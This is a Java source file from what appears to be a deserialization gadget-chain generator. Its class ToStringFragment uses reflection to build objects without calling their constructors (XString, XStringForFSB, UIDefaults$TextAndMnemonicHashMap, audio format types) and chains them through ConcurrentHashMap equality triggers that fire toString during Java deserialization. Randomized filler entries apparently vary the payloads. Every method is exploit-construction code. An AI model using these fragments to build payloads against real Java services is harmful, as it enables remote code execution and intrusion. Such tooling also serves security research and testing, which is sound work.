package gadgetFragment;

import org.apache.xpath.objects.XString;
import org.apache.xpath.objects.XStringForFSB;
import util.Utils;
import util.Reflections;

import javax.sound.sampled.AudioFileFormat;
import java.lang.reflect.Method;
import java.util.concurrent.ConcurrentHashMap;

public class ToStringFragment {
    public static Object getUdTAMToStringTrigger(Object o1, int eqTriggerNumber) throws Exception {
        Class clazz = Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Object textAndMnemonicHashMap = Reflections.createWithoutConstructor(clazz);
        Method method = clazz.getMethod("put", new Class[]{Object.class, Object.class});
        int elementCount = Utils.generateRandomInt()+1;
        for (int i=0; i < elementCount; i++)
            method.invoke(textAndMnemonicHashMap, new Object[]{Utils.generateRandomString(), Utils.generateRandomString()});

        Reflections.setFieldValue(textAndMnemonicHashMap, "loadFactor", 0.75f);

        ConcurrentHashMap concurrentHashMap;
        if (Utils.generateRandomInt() > 3)
            concurrentHashMap= Entry2HashFragment.makeConMap(o1, Utils.generateRandomInt()+2);
        else concurrentHashMap = Entry2HashFragment.makeConMap(o1, Utils.generateRandomString());

        return Entry2EqualFragment.getEqualTrigger(concurrentHashMap, textAndMnemonicHashMap, eqTriggerNumber);
    }

    public static Object getXString(Object o1, int eqTriggerNumber) throws Exception {
        XString xString = Reflections.createWithoutConstructor(XString.class);
        return Entry2EqualFragment.getEqualTrigger(xString, o1, eqTriggerNumber);
    }

    public static Object getXStringForFSB(Object o1, int eqTriggerNumber) throws Exception {
        XStringForFSB xStringForFSB = Reflections.createWithoutConstructor(XStringForFSB.class);
        Reflections.setFieldValue(xStringForFSB, "m_strCache", Utils.generateRandomString());
        return Entry2EqualFragment.getEqualTrigger(xStringForFSB, o1, eqTriggerNumber);
    }

    public static Object getAdFType(Object o1, int eqTriggerNumber) throws Exception {
        Object toStringObjTrigger = new AudioFileFormat.Type(null, Utils.generateRandomString());
        return Entry2EqualFragment.getEqualTrigger(o1, toStringObjTrigger, eqTriggerNumber);
    }

    public static Object getAdFEncoding(Object o1, int eqTriggerNumber) throws Exception {
        Object toStringObjTrigger = new javax.sound.sampled.AudioFormat.Encoding(null);
        return Entry2EqualFragment.getEqualTrigger(o1, toStringObjTrigger, eqTriggerNumber);
    }
}
